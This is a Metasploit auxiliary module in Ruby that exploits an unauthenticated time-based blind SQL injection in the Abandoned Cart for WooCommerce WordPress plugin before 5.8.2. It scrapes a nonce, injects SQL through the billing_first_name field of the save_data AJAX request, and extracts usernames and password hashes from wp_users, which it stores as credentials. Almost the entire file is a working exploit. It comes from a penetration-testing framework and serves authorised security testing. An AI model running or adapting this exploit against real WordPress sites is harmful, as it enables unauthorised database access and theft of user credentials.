##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  require 'metasploit/framework/hashes/identify'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Abandoned Cart for WooCommerce SQLi Scanner',
        'Description' => %q{
          Abandoned Cart, a plugin for WordPress which extends the WooCommerce plugin,
          prior to 5.8.2 is affected by an unauthenticated SQL injection via the
          billing_first_name parameter of the save_data AJAX call.  A valid
          wp_woocommerce_session cookie is required, which has at least one item in the
          cart.
        },
        'Author' => [
          'h00die', # msf module
          'WPDeeply', # Discovery and PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['WPVDB', '10461'],
          ['URL', 'https://wpdeeply.com/woocommerce-abandoned-cart-before-5-8-2-sql-injection/'],
          ['URL', 'https://plugins.trac.wordpress.org/changeset/2413885']
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2020-11-05'
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1]),
      OptString.new('CHECKOUTURL', [true, 'Checkout URL', '/index.php/checkout/']),
      OptString.new('COOKIE', [true, 'Cookie with an item in the shopping cart. Must contain wp_woocommerce_session', ''])
    ]
  end

  def run_host(ip)
    unless wordpress_and_online?
      vprint_error('Server not online or not detected as wordpress')
      return
    end

    checkcode = check_plugin_version_from_readme('woocommerce-abandoned-cart', '5.8.2')
    if checkcode == Msf::Exploit::CheckCode::Safe
      vprint_error('Abandoned Cart for WooCommerce version not vulnerable')
      return
    end
    print_good('Vulnerable version detected')

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, datastore['CHECKOUTURL']),
      'cookie' => datastore['COOKIE']
    })

    fail_with Failure::Unreachable, 'Connection failed' unless res

    unless res.body =~ /name="wcal_guest_capture_nonce" value="([^"]*)"/
      print_error('Unable to find wcal_guest_capture_nonce')
      return
    end
    nonce = Regexp.last_match[1]
    print_status("Nonce: #{nonce}")

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      # required or you get values like <> for username and *)/?*//-?//>/?=)+ for password hash
      if payload.include?('<')
        payload.gsub!(/<>/, '=')
        payload.gsub!(/(sleep\(\d+\.?\d*\)),0/) { "0,#{Regexp.last_match(1)}" }
      end

      res = send_request_cgi({
        'method' => 'POST',
        'cookie' => datastore['COOKIE'],
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_post' => {
          'billing_first_name' => "#{Rex::Text.rand_text_alpha_lower(6)}','','','','',( TRUE AND #{payload})) -- #{Rex::Text.rand_text_alpha_lower(1)}",
          'billing_last_name' => Rex::Text.rand_surname,
          'billing_company' => '',
          'billing_address_1' => Rex::Text.rand_text_alpha(8),
          'billing_address_2' => '',
          'billing_city' => Rex::Text.rand_text_alpha(6),
          'billing_state' => Rex::Text.rand_state,
          'billing_postcode' => Rex::Text.rand_text_numeric(6),
          'billing_country' => Rex::Text.rand_country,
          'billing_phone' => Rex::Text.rand_text_numeric(9),
          'billing_email' => "#{Rex::Text.rand_surname}@#{Rex::Text.rand_text_alpha_lower(6)}.com",
          'order_notes' => '',
          'wcal_guest_capture_nonce' => nonce,
          'action' => 'save_data'
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    columns = ['user_login', 'user_pass']

    print_status('Enumerating Usernames and Password Hashes')
    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good(table.to_s)
  end
end
